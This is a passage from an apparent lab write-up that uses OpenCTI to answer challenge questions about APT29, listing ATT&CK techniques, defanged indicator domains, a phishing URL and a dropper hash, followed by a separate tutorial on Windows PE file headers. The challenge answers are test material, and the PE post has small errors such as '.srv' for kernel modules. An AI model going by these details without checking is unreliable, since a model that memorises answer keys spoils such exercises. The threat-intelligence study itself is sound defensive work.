Defense Evasion

Modify Registry(T1112)
Trusted Developer Utilities Proxy Execution(T1127)


Privilege Escalation

Process Injection
Exploitation for Privilege Escalation(T1068)


Credential Access

Multi-Factor Authentication Interception(T1111)
Steal Application Access Token(T1528)


Exfiltration

Data Transfer Size Limits(T1030)
Exfiltration Over Alternative Protocol(T1048)




IndicatorsIn this section, we review indicators associated with the APT29 group, including domains, IP addresses, and other artifacts linked to their infrastructure. Indicators of compromise (IOCs) are critical for detecting, mitigating, and responding to attacks by this group.


Examples of Domain Names Related to APT29

simplesalsamix[.]com
www[.]willyminiatures[.]com
crossfity[.]com
techspaceinfo[.]com

Solving the Questions

What are the names of these two key campaigns in APT29’s history?


Answer: SolarWinds Compromise , Operation Ghost 


What is the name of the Tor plugin mostly used by APT29 to tunnel Tor traffic through  HTTPS connections?


Answer: meek 


which MITRE ATT&CK technique IDs are linked to APT29’s most recently observed attack patterns related to data exfiltration tactic?


Answer: T1048 , T1030


The domain crossfity[.]com has been associated with activity attributed to APT29. Which adversary emulation tool and malware family are linked to this domain?


To investigate this domain, we navigate to the Indicators section in OpenCTI and click on the domain to view detailed information.

By scrolling down, we can observe the relationships associated with this domain. In this case, the domain is linked to the adversary emulation tool Cobalt Strike and the malware family EnvyScout.

Answer: Cobalt Strike, EnvyScout


Given that the report references the domain name IOC crossfity[.]com, which other domain was identified as being associated with the same threat campaign?


There is one report under Latest containers about the object section for this domain. 

lets follow the report and read it to find the another domain. 
Link to the Report.

Answer: techspaceinfo.com


In the April 2023: Old Wine in a New Bottle campaign, APT29 reused a diplomatic-themed lure spoofing the Czechia Embassy, inviting recipients to a wine-tasting event. Which phishing website link was embedded in the document to deliver either an ISO or ZIP archive to the target?


Here we need to find any report related to APT29 talking about diplomatic-themed lure spoofing and read it, we can back to the dashboard and search for APT29 to see all reports related to APT29.

we can see that there is a report called Backchannel Diplomacy: APT29’s Rapidly Evolving Diplomatic Phishing Operations so lets read it. 
Link to the Report.

Answer: https://sylvio[.]com[.]br/form.php 


In the APT29 campaign from March 2023—known as the Earthquake-Themed Türkiye Campaign—which hostname was utilized?


from the same report. 

Answer: www.willyminiatures.com 


What is the name of the PDF decoy used in APT29’s Earthquake-Themed Türkiye Campaign?



Answer: e-yazi.pdf 


In the June 2023 Split ROOTSAW Campaign, the attacker deployed a variant of the ROOTSAW dropper specific to that operation. What is the MD5 hash of the ROOTSAW dropper with the .svg extension used in this campaign?


We are still in the same report.

Answer: 295527e2e38da97167979ade004de880


Tracking phishing infrastructure is essential for identifying current and future threat activity. In the campaign, NOBELIUM uses Poland’s Ambassador’s Visit to the U.S. to target EU governments that are assisting Ukraine. Which two URL indicators were used by APT29 in a phishing operation involving a weaponized document spoofing an El Salvador-based library website?Note: Do not include square brackets in your answer.


Here we need to search for another report related to NOBELIUM uses Poland's Ambassador’s Visit to the U.S. to target EU governments that are assisting Ukraine, we can go to Analaysis -> Reports in OpenCTI and see all reports ralated to APT29.

we can see one report under the title NOBELIUM Uses Poland's Ambassador’s Visit to the U.S. to Target EU Governments, so this what we want, lets read it.

Each of the previously mentioned URLs delivered .iso files containing a .lnk file and a .dll file with matching hashes. What is the command used by the .lnk file?

ConculsionIn this analysis, we leveraged OpenCTI to explore and examine the APT29 threat group from a structured threat intelligence perspective. By analyzing victimology, campaigns, tools, attack patterns, and indicators of compromise (IOCs), we gained a comprehensive understanding of the group’s operational behavior and strategic objectives.

title: Inside the PE File Format: A Deep Dive
content:
IntroductionWhat is this?This post is a deep dive into the Portable Executable (PE) file format. We’ll explore how PE files are structured on disk and how they are mapped and loaded into memory.
Why we need to learn the PE file format?Knowledge of the PE file format is fundamental for anyone working in reverse engineering or malware analysis. Many techniques used in both fields rely heavily on how executables are structured and loaded into memory. Without a clear understanding of PE internals, it becomes difficult to properly analyze binaries, identify suspicious behavior, or understand how certain techniques are implemented.
Overview of PE file structurePE filesPE stands for Portable Executable, it’s a file format for executables used in Windows operating systems,not only .exe files are PE files, dynamic link libraries (.dll), Kernel modules (.srv) and many others are also PE files.
A PE file is a data structure that contains all the information required by the operating system loader to map the executable into memory and start its execution.
PE Structure OverviewA typical PE file follows a well-defined structure, as illustrated in the figure below: 
DOS HeaderEvery PE file starts with a 64-byte structure called the DOS header, which enables the file to be identified as a valid MS-DOS executable.
DOS StubFollowing the DOS header is the DOS stub, a small MS-DOS–compatible program whose only purpose is to display the message “This program cannot be run in DOS mode” if the executable is run in a DOS environment.
NT HeadersThe NT Headers structure contains three main components:

PE Signature: A 4-byte magic value used to validate the file as a PE format.
File Header (COFF Header): Holds metadata about the binary, including target machine, number of sections, and characteristics.
Optional Header: The core of the PE structure. While optional for object files, it is required for executable images. It defines key attributes such as the entry point, image base, and memory alignment, all of which are used by the OS loader during execution.

Section TableThe Section Table, located directly after the Optional Header, is an array of Image Section Headers. Each header describes a section in the PE file, including its size, location, and characteristics.
SectionsSections store the real content of the PE file, such as code, data, and resources. Each section has its own purpose and is described by a header in the Section Table.
PE-bearTo understand the PE file structure, it helps to visualize it with a PE viewer. My personal favorite is PE-bear, which we’ll use in this post to examine the different headers and sections.
 
Looking at the left panel of PE-bear, the structure of this sample file becomes clear, showing headers and sections just as described.
HeadersDOS HeaderThe DOS header, also called the MS-DOS header, is a 64-byte structure located at the very start of a PE file.
While it’s not essential for the functionality of PE files on modern Windows systems, it exists for backward compatibility. This header identifies the file as an MS-DOS executable. If the file is loaded on an MS-DOS system, the DOS stub gets executed instead of the actual program. Without this header, attempting to run the executable on MS-DOS would fail, producing a generic error.
StructureThe DOS header is defined in winnt.h as the IMAGE_DOS_HEADER structure:
typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header    WORD   e_magic;                     // Magic number    WORD   e_cblp;                      // Bytes on last page of file    WORD   e_cp;                        // Pages in file    WORD   e_crlc;                      // Relocations    WORD   e_cparhdr;                   // Size of header in paragraphs    WORD   e_minalloc;                  // Minimum extra paragraphs needed    WORD   e_maxalloc;                  // Maximum extra paragraphs needed    WORD   e_ss;                        // Initial (relative) SS value    WORD   e_sp;                        // Initial SP value    WORD   e_csum;                      // Checksum    WORD   e_ip;                        // Initial IP value    WORD   e_cs;                        // Initial (relative) CS value    WORD   e_lfarlc;                    // File address of relocation table    WORD   e_ovno;                      // Overlay number    WORD   e_res[4];                    // Reserved words    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)    WORD   e_oeminfo;                   // OEM information; e_oemid specific    WORD   e_res2[10];                  // Reserved words    LONG   e_lfanew;                    // File address of new exe header} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

Most of the members in this structure are only relevant for MS-DOS, but a few are critical for Windows PE loading. The key members are:

e_magic: The first member of the DOS header, a 2-byte WORD. It’s called the magic number and has a fixed value of 0x5A4D (MZ in ASCII). It serves as the signature that identifies the file as an MS-DOS executable.
e_lfanew: Located at offset 0x3C in the DOS header, this member holds the offset to the start of the NT headers. On Windows systems, this is crucial for the PE loader because it tells the loader where to find the File Header and Optional Header.

We can view the contents of the DOS Header using PE-bear on our sample PE file: 
As you can see, the first member of the header is the magic number, which has the fixed value 0x5A4D (MZ) that we discussed earlier.
The last member of the DOS Header, located at offset 0x3C, is labeled “File address of new exe header” (e_lfanew). In our sample file, it has the value 0xB0. If we navigate to that offset in the file, we find the start of the NT Headers, just as expected.
DOS StubThe DOS stub is a small MS-DOS program embedded in the PE file. Its only purpose is to display an error message if the executable is run in a DOS environment and then exit. By default, this message is:
“This program cannot be run in DOS mode.”
Rich HeaderNow that we’ve explored the DOS Header and DOS Stub, there’s still a chunk of data sitting between the DOS Stub and the start of the NT Headers that we haven’t covered yet.
This chunk is commonly known as the Rich Header. It’s an undocumented structure present only in executables built using the Microsoft Visual Studio toolset. The Rich Header contains metadata about the tools used to compile the executable, including tool names, types, versions, and build numbers.
Interestingly, most resources on PE files don’t mention the Rich Header at all. That makes sense because it isn’t strictly part of the PE format — it can even be zeroed out without affecting the executable’s functionality. Microsoft includes it mainly for internal build tracking.
Structure of the Rich HeaderThe Rich Header is made up of:

XORed data
Signature (Rich)
32-bit checksum (used as the XOR key)

The encrypted data starts with a DWORD signature DanS, followed by three zeroed-out DWORDs for padding. After that, it contains pairs of DWORDs, each representing an entry. Each entry records:

The tool ID (high WORD of the first DWORD) or product ID
The build ID (low WORD of the first DWORD)
The use count (second DWORD of the pair)

PE-bear parse the Rich Header automatically, so you can inspect it without manual decoding. 
NT HeadersThe NT Headers are defined in winnt.h as the IMAGE_NT_HEADERS structure. Looking at its definition, we can see that it consists of three main members:

DWORD Signature – Identifies the file as a PE file.
IMAGE_FILE_HEADER FileHeader – Contains general information about the PE file, such as the target architecture and the number of sections.
IMAGE_OPTIONAL_HEADER OptionalHeader – Provides essential information for the OS loader, including the entry point, memory layout, and required libraries.

It’s worth noting that there are two versions of this structure:

IMAGE_NT_HEADERS for 32-bit executables (PE32)
IMAGE_NT_HEADERS64 for 64-bit executables (PE32+)

The main difference between the two is the version of the Optional Header they use:

IMAGE_OPTIONAL_HEADER32 for 32-bit executables
IMAGE_OPTIONAL_HEADER64 for 64-bit executables

typedef struct _IMAGE_NT_HEADERS64 {    DWORD Signature;    IMAGE_FILE_HEADER FileHeader;    IMAGE_OPTIONAL_HEADER64 OptionalHeader;} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;typedef struct _IMAGE_NT_HEADERS {    DWORD Signature;    IMAGE_FILE_HEADER FileHeader;    IMAGE_OPTIONAL_HEADER32 OptionalHeader;} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

This distinction ensures that the PE loader can handle both 32-bit and 64-bit executables correctly.
SignatureThe first part of the NT Headers is the PE signature. This is a 4-byte (DWORD) value that identifies the file as a Portable Executable. Its fixed value is 0x50450000, which corresponds to PE\0\0 in ASCII. This signature acts like a marker, letting the Windows loader know where the PE-specific structures begin.
Here’s how it looks in PE-bear on our sample file: 
File HeaderThe File Header is a simple structure that stores basic information about the PE file. It’s defined in winnt.h as IMAGE_FILE_HEADER:
typedef struct _IMAGE_FILE_HEADER {    WORD    Machine;    WORD    NumberOfSections;    DWORD   TimeDateStamp;    DWORD   PointerToSymbolTable;    DWORD   NumberOfSymbols;    WORD    SizeOfOptionalHeader;    WORD    Characteristics;} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

This structure contains 7 members, each with a specific role:

Machine: Indicates the CPU architecture that the executable targets. Common values are 0x8664 for AMD64 and 0x14c for i386.
NumberOfSections: The total number of sections in the PE file (or the size of the Section Table).
TimeDateStamp: A timestamp showing when the file was created, stored as a Unix time value.
PointerToSymbolTable and NumberOfSymbols: These fields point to the COFF symbol table and indicate the number of entries, but they are usually set to 0 because COFF debugging information is deprecated.
SizeOfOptionalHeader: The size of the Optional Header following this File Header.
Characteristics: Flags that describe the file’s attributes, such as whether it’s executable, a system file, or a library.

Here’s an example of the File Header contents from a real PE file: 
Optional HeaderThe Optional Header is the most critical part of the NT Headers. The Windows PE loader relies on this header to find the information it needs to load and execute the program correctly. it’s mandatory for executable image files. Its size is not fixed, which is why the SizeOfOptionalHeader member in the File Header exists.
Structure OverviewThe first few members of the Optional Header are standard across all COFF implementations, while the remaining members are Windows-specific extensions. These extra fields are required by the Windows loader and linker to properly handle executables.
There are two versions of the Optional Header:

IMAGE_OPTIONAL_HEADER32 – used for 32-bit executables
IMAGE_OPTIONAL_HEADER64 – used for 64-bit executables

The differences between the two are mainly:

Number of members – PE32 has 31 members, while PE32+ has 30. PE32 includes a BaseOfData field, which marks the start of the data section in memory.
Data types for certain fields – In PE32+, five members that are DWORD in 32-bit are ULONGLONG in 64-bit:
ImageBase
SizeOfStackReserve
SizeOfStackCommit
SizeOfHeapReserve
SizeOfHeapCommit



The definition of both structures:
typedef struct _IMAGE_OPTIONAL_HEADER {  WORD                 Magic;  BYTE                 MajorLinkerVersion;  BYTE                 MinorLinkerVersion;  DWORD                SizeOfCode;  DWORD                SizeOfInitializedData;  DWORD                SizeOfUninitializedData;  DWORD                AddressOfEntryPoint;  DWORD                BaseOfCode;  DWORD                BaseOfData;  DWORD                ImageBase;  DWORD                SectionAlignment;  DWORD                FileAlignment;  WORD                 MajorOperatingSystemVersion;  WORD                 MinorOperatingSystemVersion;  WORD                 MajorImageVersion;  WORD                 MinorImageVersion;  WORD                 MajorSubsystemVersion;  WORD                 MinorSubsystemVersion;  DWORD                Win32VersionValue;  DWORD                SizeOfImage;  DWORD                SizeOfHeaders;  DWORD                CheckSum;  WORD                 Subsystem;  WORD                 DllCharacteristics;  DWORD                SizeOfStackReserve;  DWORD                SizeOfStackCommit;  DWORD                SizeOfHeapReserve;  DWORD                SizeOfHeapCommit;  DWORD                LoaderFlags;  DWORD                NumberOfRvaAndSizes;  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct _IMAGE_OPTIONAL_HEADER64 {  WORD                 Magic;  BYTE                 MajorLinkerVersion;  BYTE                 MinorLinkerVersion;  DWORD                SizeOfCode;  DWORD                SizeOfInitializedData;  DWORD                SizeOfUninitializedData;  DWORD                AddressOfEntryPoint;  DWORD                BaseOfCode;  ULONGLONG            ImageBase;  DWORD                SectionAlignment;  DWORD                FileAlignment;  WORD                 MajorOperatingSystemVersion;  WORD                 MinorOperatingSystemVersion;  WORD                 MajorImageVersion;  WORD                 MinorImageVersion;  WORD                 MajorSubsystemVersion;  WORD                 MinorSubsystemVersion;  DWORD                Win32VersionValue;  DWORD                SizeOfImage;  DWORD                SizeOfHeaders;  DWORD                CheckSum;  WORD                 Subsystem;  WORD                 DllCharacteristics;  ULONGLONG            SizeOfStackReserve;  ULONGLONG            SizeOfStackCommit;  ULONGLONG            SizeOfHeapReserve;  ULONGLONG            SizeOfHeapCommit;  DWORD                LoaderFlags;  DWORD                NumberOfRvaAndSizes;  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

Structure members:

Magic – Identifies the file type:
0x10B → PE32 (32-bit)
0x20B → PE32+ (64-bit)
0x107 → ROM imageThis field determines whether the executable is 32-bit or 64-bit. The Machine field in the File Header is ignored by the loader.


MajorLinkerVersion / MinorLinkerVersion – Linker version numbers.
SizeOfCode / SizeOfInitializedData / SizeOfUninitializedData – Sizes of the code, initialized data, and uninitialized data sections.
AddressOfEntryPoint – The relative virtual address (RVA) where execution begins. For DLLs, this may be zero.
BaseOfCode / BaseOfData (PE32 only) – RVAs of the code and data sections.
ImageBase – Preferred memory address for the image. Modern systems often relocate the image due to ASLR or other memory constraints.
SectionAlignment / FileAlignment – Control how sections are aligned in memory and on disk.
Version fields – MajorOperatingSystemVersion, MinorOperatingSystemVersion, MajorImageVersion, MinorImageVersion, MajorSubsystemVersion, MinorSubsystemVersion specify OS, image, and subsystem versions.
SizeOfImage / SizeOfHeaders – Total image size and total size of headers, rounded up to alignments.
Subsystem – Specifies the required Windows subsystem for this executable.
DllCharacteristics – Flags defining runtime characteristics, such as NX support or relocatability.
Stack and Heap sizes – SizeOfStackReserve, SizeOfStackCommit, SizeOfHeapReserve, SizeOfHeapCommit define memory allocation for the stack and heap.
LoaderFlags / Win32VersionValue – Reserved fields, usually set to zero.
NumberOfRvaAndSizes – The number of entries in the DataDirectory array, which holds important tables like imports, exports, and relocations.
DataDirectory: An array of IMAGE_DATA_DIRECTORY structures.

Now, let’s examine the Optional Header as it appears in a real PE file. 
Data DirectoriesThe last member of the Optional Header is the Data Directories, and it’s worth taking a closer look.
What Are Data Directories?In the IMAGE_OPTIONAL_HEADER structure, the Data Directories are represented as an array of IMAGE_DATA_DIRECTORY structures:
IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16

Each IMAGE_DATA_DIRECTORY has just two members:
typedef struct _IMAGE_DATA_DIRECTORY {    DWORD VirtualAddress;  // RVA to the start of the data    DWORD Size;            // Size of the data} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

In simple terms, a Data Directory points to a specific type of data stored somewhere in the PE file sections. The VirtualAddress is an RVA pointing to that data, and the Size tells you how big it is.
Data Directories are used by the Windows loader to locate important information. For example, the Import Directory contains a list of functions imported from other libraries, which the loader needs to resolve before executing the program.
Standard Data Directory EntriesThe PE format defines 16 possible Data Directories, each identified by an index in the array:
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime Descriptor

When examining the DataDirectory array in an actual PE file, you may see entries where both VirtualAddress and Size are zero. 
This simply means that this particular directory is not present in the executable.
Section HeadersAfter the Optional Header and before the sections comes the Section Headers. Each section is preceded by a Section Header, which describes its properties. The structure is defined as:
typedef struct _IMAGE_SECTION_HEADER {    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];    union {        DWORD PhysicalAddress;        DWORD VirtualSize;    } Misc;    DWORD   VirtualAddress;    DWORD   SizeOfRawData;    DWORD   PointerToRawData;    DWORD   PointerToRelocations;    DWORD   PointerToLineNumbers;    WORD    NumberOfRelocations;    WORD    NumberOfLineNumbers;    DWORD   Characteristics;} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

members:

Name – Section name (max 8 characters).
VirtualSize – Total size of the section when loaded in memory.
VirtualAddress – RVA of the section start relative to the image base.
SizeOfRawData – Size of the section on disk (rounded to FileAlignment).
PointerToRawData – File offset to the section’s data.
Characteristics – Flags describing the section (executable, writable, shared, etc.).

Here’s a view of section headers in PE-bear, showing each section’s name, size, and characteristics (Our sample contains just two sections). 
SectionsAfter the headers, the rest of the PE file is divided into sections. Sections are containers for the executable’s actual data: code, resources, and other necessary information.
Some common section names:

.text – Executable code
.data – Initialized data
.bss – Uninitialized data
.rdata – Read-only initialized data
.edata – Export tables
.idata – Import tables
.reloc – Relocation information
.rsrc – Resources (images, icons, embedded binaries)

PE ImportsPE imports are a core mechanism in Windows executable files that list the external DLLs (Dynamic Link Libraries) and specific functions a program needs to run, such as system API calls. They allow the operating system’s loader to map necessary code, such as kernel32.dll, into memory, enabling functionality like file handling or network access.
Key components of PE imports include:

Import Directory Table: An array of descriptors, one for each imported DLL, marking the start of the import data.
Import Lookup Table (ILT/INT): A table holding pointers to the names or ordinals (IDs) of the functions to be imported.
Import Address Table (IAT): A table updated at runtime by the loader, which replaces the function names with the actual memory addresses of those functions, enabling direct calls.

Import Directory TableThe Import Directory Table sits at the start of the .idata section. It is essentially a Data Directory that lists all the DLLs imported by the executable.
It’s made of an array of IMAGE_IMPORT_DESCRIPTOR structures—one per DLL. The array ends with a zeroed-out entry to mark the end.
typedef struct _IMAGE_IMPORT_DESCRIPTOR {    union {        DWORD   Characteristics;         DWORD   OriginalFirstThunk;    } DUMMYUNIONNAME;    DWORD   TimeDateStamp;    DWORD   ForwarderChain;    DWORD   Name;    DWORD   FirstThunk;} IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;


OriginalFirstThunk: RVA pointing to the Import Lookup Table (ILT) for this DLL.
Name: RVA of an ASCII string containing the DLL name.
FirstThunk: RVA of the Import Address Table (IAT).
ForwarderChain: Usually 0 unless the DLL forwards functions to another DLL.
TimeDateStamp: Typically 0, not used for unbound imports.

Import Lookup Table (ILT) / Import Name Table (INT)The ILT tells the loader which functions to import from the DLL. Its RVA is stored in OriginalFirstThunk.

PE32: 32-bit entries
PE32+: 64-bit entries

The ILT ends with a zeroed-out entry.
ILT entry format:

MSB (Bit 31/63): Ordinal/Name flag
1 → import by ordinal
0 → import by name


Other bits:
Ordinal mode: stores the 16-bit ordinal of the function
Name mode: stores the RVA of a Hint/Name Table entry



Hint/Name TableThe Hint/Name Table contains the names of functions to import:
typedef struct _IMAGE_IMPORT_BY_NAME {    WORD    Hint;    CHAR    Name[1];} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;


Hint: A number used as a quick index into the DLL’s export table.
Name: Null-terminated string with the function name.

When the loader processes the ILT, it uses the Hint and Name to resolve the function’s actual address in the DLL.
Import Address Table (IAT)The IAT is where the executable ultimately calls imported functions.On disk, the IAT is identical to the ILT.When the binary is loaded, the loader overwrites each entry with the real address of the imported function in memory.
